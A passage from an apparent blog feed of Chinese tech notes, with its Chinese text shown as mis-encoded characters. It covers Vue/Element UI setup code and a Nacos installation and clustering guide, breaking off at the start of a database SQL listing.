class="hljs-literal">false</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">ElementUI</span>)<span class="hljs-comment">// ä½¿ç”¨ElementUI</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>src&#x2F;App.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;template&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-row</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-search&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-edit&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-check&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;info&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-message&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-star-off&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;danger&quot;</span> <span class="hljs-attr">icon</span>=<span class="hljs-string">&quot;el-icon-delete&quot;</span> <span class="hljs-attr">circle</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li></ol><h2 id="5-3element-uiæŒ‰éœ€å¼•å…¥"><a href="#5-3element-uiæŒ‰éœ€å¼•å…¥" class="headerlink" title="5.3element-uiæŒ‰éœ€å¼•å…¥"></a>5.3element-uiæŒ‰éœ€å¼•å…¥</h2><ol><li><p>å®‰è£… babel-plugin-componentnpm i babel-plugin-component -D </p></li><li><p>ä¿®æ”¹ babel-config-js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">presets</span>: [<br>    <span class="hljs-string">&#x27;@vue/cli-plugin-babel/preset&#x27;</span>,<br>    [<span class="hljs-string">&quot;@babel/preset-env&quot;</span>, &#123; <span class="hljs-string">&quot;modules&quot;</span>: <span class="hljs-literal">false</span> &#125;]<br>  ],<br>  <span class="hljs-attr">plugins</span>: [<br>    [<br>      <span class="hljs-string">&quot;component&quot;</span>,<br>      &#123;        <br>        <span class="hljs-string">&quot;libraryName&quot;</span>: <span class="hljs-string">&quot;element-ui&quot;</span>,<br>        <span class="hljs-string">&quot;styleLibraryName&quot;</span>: <span class="hljs-string">&quot;theme-chalk&quot;</span><br>      &#125;<br>    ]<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>src&#x2F;main.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Button</span>,<span class="hljs-title class_">Row</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span><span class="hljs-comment">// æŒ‰éœ€å¼•å…¥</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-title class_">Button</span>.<span class="hljs-property">name</span>, <span class="hljs-title class_">Button</span>);<br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-title class_">Row</span>.<span class="hljs-property">name</span>, <span class="hljs-title class_">Row</span>);<br><span class="hljs-comment">/* æˆ–å†™ä¸º</span><br><span class="hljs-comment"> * Vue.use(Button)</span><br><span class="hljs-comment"> * Vue.use(Row)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),<br>&#125;)<br></code></pre></td></tr></table></figure></li></ol><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li>å°šç¡…è°·ä¸»è®²çš„vueï¼š<a href="https://www.bilibili.com/video/BV1Zy4y1K7SH?p=77&amp;spm_id_from=pageDriver">https://www.bilibili.com/video/BV1Zy4y1K7SH?p=77&amp;spm_id_from=pageDriver</a></li><li>ç°ä»£JavaScriptï¼š<a href="https://zh.javascript.info/">https://zh.javascript.info/</a></li><li>MDNæ–‡æ¡£ï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Web">https://developer.mozilla.org/zh-CN/docs/Web</a></li><li>æˆ‘æ˜¯ä½ çš„è¶…çº§è‹±é›„ <a href="https://juejin.cn/post/6844903895467032589">https://juejin.cn/post/6844903895467032589</a></li><li>æ ¼é›·ç‹æ€çš„vueåŸºç¡€ç”¨æ³•&amp;åŸºç¡€åŸç†æ•´ç† <a href="https://blog.csdn.net/hangao233/article/details/123990192?spm=1001.2014.3001.5502">https://blog.csdn.net/hangao233/article/details/123990192?spm=1001.2014.3001.5502</a></li><li>cessçš„VUEç¬”è®° <a href="https://www.yuque.com/cessstudy/kak11d">å‰ç«¯ (yuque.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å‰ç«¯</category>
      
      <category>Vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacosä½¿ç”¨æŒ‡å—</title>
    <link href="/2022/11/23/Nacos%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2022/11/23/Nacos%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Windowså®‰è£…"><a href="#1-Windowså®‰è£…" class="headerlink" title="1.Windowså®‰è£…"></a>1.Windowså®‰è£…</h1><p>å¼€å‘é˜¶æ®µé‡‡ç”¨å•æœºå®‰è£…å³å¯ã€‚</p><h2 id="1-1-ä¸‹è½½å®‰è£…åŒ…"><a href="#1-1-ä¸‹è½½å®‰è£…åŒ…" class="headerlink" title="1.1.ä¸‹è½½å®‰è£…åŒ…"></a>1.1.ä¸‹è½½å®‰è£…åŒ…</h2><p>åœ¨Nacosçš„GitHubé¡µé¢ï¼Œæä¾›æœ‰ä¸‹è½½é“¾æ¥ï¼Œå¯ä»¥ä¸‹è½½ç¼–è¯‘å¥½çš„NacosæœåŠ¡ç«¯æˆ–è€…æºä»£ç ï¼š</p><p>GitHubä¸»é¡µï¼š<a href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></p><p>GitHubçš„Releaseä¸‹è½½é¡µï¼š<a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p><p>å¦‚å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951713.png" alt="image-20210402161102887"></p><p>ä¹Ÿå¯ä»¥åˆ°æˆ‘çš„ç½‘ç›˜è¿›è¡Œä¸‹è½½ï¼Œ<a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">ç½‘ç›˜è¿æ¥</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221123092819398.png" alt="image-20221123092819398"></p><p>windowsç‰ˆæœ¬ä½¿ç”¨<code>nacos-server-1.4.1.zip</code>åŒ…å³å¯ã€‚</p><h2 id="1-2-è§£å‹"><a href="#1-2-è§£å‹" class="headerlink" title="1.2.è§£å‹"></a>1.2.è§£å‹</h2><p>å°†è¿™ä¸ªåŒ…è§£å‹åˆ°ä»»æ„éä¸­æ–‡ç›®å½•ä¸‹ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951644.png" alt="image-20210402161843337"></p><p>ç›®å½•è¯´æ˜ï¼š</p><ul><li>binï¼šå¯åŠ¨è„šæœ¬</li><li>confï¼šé…ç½®æ–‡ä»¶</li></ul><h2 id="1-3-ç«¯å£é…ç½®"><a href="#1-3-ç«¯å£é…ç½®" class="headerlink" title="1.3.ç«¯å£é…ç½®"></a>1.3.ç«¯å£é…ç½®</h2><p>Nacosçš„é»˜è®¤ç«¯å£æ˜¯8848ï¼Œå¦‚æœä½ ç”µè„‘ä¸Šçš„å…¶å®ƒè¿›ç¨‹å ç”¨äº†8848ç«¯å£ï¼Œè¯·å…ˆå°è¯•å…³é—­è¯¥è¿›ç¨‹ã€‚</p><p><strong>å¦‚æœæ— æ³•å…³é—­å ç”¨8848ç«¯å£çš„è¿›ç¨‹</strong>ï¼Œä¹Ÿå¯ä»¥è¿›å…¥nacosçš„confç›®å½•ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„ç«¯å£ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951753.png" alt="image-20210402162008280"></p><p>ä¿®æ”¹å…¶ä¸­çš„å†…å®¹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951804.png" alt="image-20210402162251093"></p><h2 id="1-4-å¯åŠ¨"><a href="#1-4-å¯åŠ¨" class="headerlink" title="1.4.å¯åŠ¨"></a>1.4.å¯åŠ¨</h2><p>å¯åŠ¨éå¸¸ç®€å•ï¼Œè¿›å…¥binç›®å½•ï¼Œç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951672.png" alt="image-20210402162350977"></p><p>ç„¶åæ‰§è¡Œå‘½ä»¤å³å¯ï¼š</p><ul><li><p>windowså‘½ä»¤ï¼š</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">startup.<span class="hljs-built_in">cmd</span> -m standalone<br></code></pre></td></tr></table></figure></li></ul><p>æ‰§è¡Œåçš„æ•ˆæœå¦‚å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951926.png" alt="image-20210402162526774"></p><h2 id="1-5-è®¿é—®"><a href="#1-5-è®¿é—®" class="headerlink" title="1.5.è®¿é—®"></a>1.5.è®¿é—®</h2><p>åœ¨æµè§ˆå™¨è¾“å…¥åœ°å€ï¼š<a href="http://127.0.0.1:8848/nacos%E5%8D%B3%E5%8F%AF%EF%BC%9A">http://127.0.0.1:8848/nacoså³å¯ï¼š</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951194.png" alt="image-20210402162630427"></p><p>é»˜è®¤çš„è´¦å·å’Œå¯†ç éƒ½æ˜¯nacosï¼Œè¿›å…¥åï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951179.png" alt="image-20210402162709515"></p><h1 id="2-Linuxå®‰è£…"><a href="#2-Linuxå®‰è£…" class="headerlink" title="2.Linuxå®‰è£…"></a>2.Linuxå®‰è£…</h1><p>Linuxæˆ–è€…Macå®‰è£…æ–¹å¼ä¸Windowsç±»ä¼¼ã€‚</p><h2 id="2-1-å®‰è£…JDK"><a href="#2-1-å®‰è£…JDK" class="headerlink" title="2.1.å®‰è£…JDK"></a>2.1.å®‰è£…JDK</h2><p>Nacosä¾èµ–äºJDKè¿è¡Œï¼Œç´¢å¼•Linuxä¸Šä¹Ÿéœ€è¦å®‰è£…JDKæ‰è¡Œã€‚</p><p><a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">JDKç½‘ç›˜ä¸‹è½½è¿æ¥</a></p><p>ä¸Šä¼ jdkå®‰è£…åŒ…</p><p>ä¸Šä¼ åˆ°æŸä¸ªç›®å½•ï¼Œä¾‹å¦‚ï¼š**&#x2F;usr&#x2F;local&#x2F;**</p><p>ç„¶åè§£å‹ç¼©ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -xvf jdk-8u144-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p>ç„¶åé‡å‘½åä¸ºjava</p><p>é…ç½®ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> JAVA_HOME=/usr/local/java<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br></code></pre></td></tr></table></figure><p>è®¾ç½®ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">source</span> /etc/profile<br></code></pre></td></tr></table></figure><h2 id="2-2-ä¸Šä¼ å®‰è£…åŒ…"><a href="#2-2-ä¸Šä¼ å®‰è£…åŒ…" class="headerlink" title="2.2.ä¸Šä¼ å®‰è£…åŒ…"></a>2.2.ä¸Šä¼ å®‰è£…åŒ…</h2><p>å¦‚å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951713.png" alt="image-20210402161102887"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æˆ‘çš„<a href="https://pan.baidu.com/s/11_5gu_SHtpUADkHu0t3TyA?pwd=52lj">ç½‘ç›˜</a>ä¸­çš„tar.gzï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221123092819398.png"></p><p>ä¸Šä¼ åˆ°LinuxæœåŠ¡å™¨çš„æŸä¸ªç›®å½•ï¼Œä¾‹å¦‚<code>/usr/local/src</code>ç›®å½•ä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951277.png" alt="image-20210402163715580"></p><h2 id="2-3-è§£å‹"><a href="#2-3-è§£å‹" class="headerlink" title="2.3.è§£å‹"></a>2.3.è§£å‹</h2><p>å‘½ä»¤è§£å‹ç¼©å®‰è£…åŒ…ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -xvf nacos-server-1.4.1.tar.gz<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ é™¤å®‰è£…åŒ…ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -rf nacos-server-1.4.1.tar.gz<br></code></pre></td></tr></table></figure><p>ç›®å½•ä¸­æœ€ç»ˆæ ·å¼ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951323.png" alt="image-20210402163858429"></p><p>ç›®å½•å†…éƒ¨ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210181951330.png" alt="image-20210402164414827"></p><h2 id="2-4-ç«¯å£é…ç½®"><a href="#2-4-ç«¯å£é…ç½®" class="headerlink" title="2.4.ç«¯å£é…ç½®"></a>2.4.ç«¯å£é…ç½®</h2><p>ä¸windowsä¸­ç±»ä¼¼</p><h2 id="2-5-å¯åŠ¨"><a href="#2-5-å¯åŠ¨" class="headerlink" title="2.5.å¯åŠ¨"></a>2.5.å¯åŠ¨</h2><p>åœ¨nacos&#x2F;binç›®å½•ä¸­ï¼Œè¾“å…¥å‘½ä»¤å¯åŠ¨Nacosï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sh startup.sh -m standalone<br></code></pre></td></tr></table></figure><h1 id="3-Nacosçš„ä¾èµ–"><a href="#3-Nacosçš„ä¾èµ–" class="headerlink" title="3.Nacosçš„ä¾èµ–"></a>3.Nacosçš„ä¾èµ–</h1><p>çˆ¶å·¥ç¨‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- nacoså®¢æˆ·ç«¯ä¾èµ–åŒ… --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="4-é›†ç¾¤ç»“æ„å›¾"><a href="#4-é›†ç¾¤ç»“æ„å›¾" class="headerlink" title="4.é›†ç¾¤ç»“æ„å›¾"></a>4.é›†ç¾¤ç»“æ„å›¾</h1><p>å®˜æ–¹ç»™å‡ºçš„Nacosé›†ç¾¤å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026460.png" alt="image-20210409210621117"></p><p>å…¶ä¸­åŒ…å«3ä¸ªnacosèŠ‚ç‚¹ï¼Œç„¶åä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨ä»£ç†3ä¸ªNacosã€‚è¿™é‡Œè´Ÿè½½å‡è¡¡å™¨å¯ä»¥ä½¿ç”¨nginxã€‚</p><p>æˆ‘ä»¬è®¡åˆ’çš„é›†ç¾¤ç»“æ„ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026231.png" alt="image-20210409211355037"></p><p>ä¸‰ä¸ªnacosèŠ‚ç‚¹çš„åœ°å€ï¼š</p><table><thead><tr><th>èŠ‚ç‚¹</th><th>ip</th><th>port</th></tr></thead><tbody><tr><td>nacos1</td><td>192.168.150.1</td><td>8845</td></tr><tr><td>nacos2</td><td>192.168.150.1</td><td>8846</td></tr><tr><td>nacos3</td><td>192.168.150.1</td><td>8847</td></tr></tbody></table><h1 id="5-æ­å»ºé›†ç¾¤"><a href="#5-æ­å»ºé›†ç¾¤" class="headerlink" title="5.æ­å»ºé›†ç¾¤"></a>5.æ­å»ºé›†ç¾¤</h1><p>æ­å»ºé›†ç¾¤çš„åŸºæœ¬æ­¥éª¤ï¼š</p><ul><li>æ­å»ºæ•°æ®åº“ï¼Œåˆå§‹åŒ–æ•°æ®åº“è¡¨ç»“æ„</li><li>ä¸‹è½½nacoså®‰è£…åŒ…</li><li>é…ç½®nacos</li><li>å¯åŠ¨nacosé›†ç¾¤</li><li>nginxåå‘ä»£ç†</li></ul><h2 id="5-1-åˆå§‹åŒ–æ•°æ®åº“"><a href="#5-1-åˆå§‹åŒ–æ•°æ®åº“" class="headerlink" title="5.1.åˆå§‹åŒ–æ•°æ®åº“"></a>5.1.åˆå§‹åŒ–æ•°æ®åº“</h2><p>Nacosé»˜è®¤æ•°æ®å­˜å‚¨åœ¨å†…åµŒæ•°æ®åº“Derbyä¸­ï¼Œä¸å±äºç”Ÿäº§å¯ç”¨çš„æ•°æ®åº“ã€‚</p><p>å®˜æ–¹æ¨èçš„æœ€ä½³å®è·µæ˜¯ä½¿ç”¨å¸¦æœ‰ä¸»ä»çš„é«˜å¯ç”¨æ•°æ®åº“é›†ç¾¤ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥å•ç‚¹çš„æ•°æ®åº“ä¸ºä¾‹æ¥è®²è§£ã€‚</p><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œå‘½åä¸ºnacosï¼Œè€Œåå¯¼å…¥ä¸‹é¢çš„SQLï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span 